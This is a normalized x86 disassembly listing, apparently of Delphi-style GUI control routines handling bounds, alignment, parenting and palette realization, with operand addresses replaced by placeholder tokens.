mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_441448
push ebx
mov ebx eax
mov eax ebx
call sub_44ebf8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4044a0
je r-xdata
mov al 0x1
pop ebx
retn
sub_441480
push ebx
mov ebx eax
mov eax ebx
call sub_44ec34
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4414b4
push ebx
mov ebx eax
mov eax ebx
call sub_41a6a0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4414dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_442580
sub_4414fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_44151c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_4040e8
sub_441540
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_442470
sub_441560
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_44158c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4044a0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_4415f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_441ecc
sub_441610
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_441eb8
sub_441630
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_441650
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419db0
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d000
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_442600
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_441170
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_443510
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_441728
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4036d0
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_461ffc
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
push edi
xor ecx ecx
mov edx 0xb039
call sub_443750
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_441ef0
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403540
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403344
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403344
mov eax [ edi + 0x68 ]
call sub_403344
mov eax [ edi + 0x64 ]
call sub_408c04
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419dfc
test bl bl
jle r-xdata
sub_4417f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_44181c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403540
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4418a4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_441ba4
sub_4418c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403344
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44456c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403540
mov edx ebx
mov eax edi
call sub_419e80
mov eax ebx
mov si 0xffd9
call sub_403540
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_44198c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a210
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_443750
sub_441a20
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a0cc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_442508
jmp r-xdata
xor edx edx
mov eax esi
call sub_4418c4
sub_441a64
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403540
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_4418a4
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403540
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_441b0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_443ce0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_442998
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_441ba4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_443750
mov eax ebx
mov si 0xffd0
call sub_403540
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403540
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_441ba4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_441cc0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_441ce4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_441d0c
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_441d30
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_441d54
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_441e4f
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403540
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441e56
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_414500
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403540
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403540
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_414210
sub_441e60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_442998
mov edx edi
mov eax ebx
call sub_441f10
mov edx edi
mov eax ebx
call sub_4437f4
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_441ecc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_4040e8
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_441f10
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_441f6c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_441f98
mov edx eax
mov ecx esp
mov eax esi
call sub_412edc
mov edx esp
mov eax ebx
call sub_4423dc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_441fb0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_441f54
mov ecx esp
mov edx esi
call sub_412edc
mov edx esp
mov eax ebx
call sub_4423dc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_441fd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442059
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442060
lea eax [ ebp - 0xc ]
call sub_404094
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
sub_442068
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_442094
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4420c0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45e4c0
sub_4420f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_443750
sub_44216c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call sub_4062e4
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_4062e4
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call sub_4062e4
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call sub_4062e4
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call sub_4062e4
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call sub_4062e4
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_4062e4
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call sub_4062e4
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41d458
push eax
call sub_4062e4
mov edx eax
mov eax ebx
call sub_41d474
sub_442338
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4423ce
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41a308
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_442550
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4044a0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4423d5
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_442580
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_4423dc
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_442424
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
test esi esi
je r-xdata
mov edx ebx
call sub_4459fc
mov edx ebx
mov eax esi
call sub_445928
mov eax ebx
call sub_441ba4
sub_442470
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403540
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_443750
mov eax edi
mov si 0xffd0
call sub_403540
sub_442508
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_456844
mov edx ebx
mov eax esi
call sub_419e80
sub_44252c
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_443750
pop ebx
retn
sub_442550
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4424c4
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404184
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_4424d4
sub_442580
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4425d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4044a0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4425dc
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax esi
call sub_404554
mov edx eax
mov eax ebx
call sub_44252c
sub_442600
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41d3b4
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
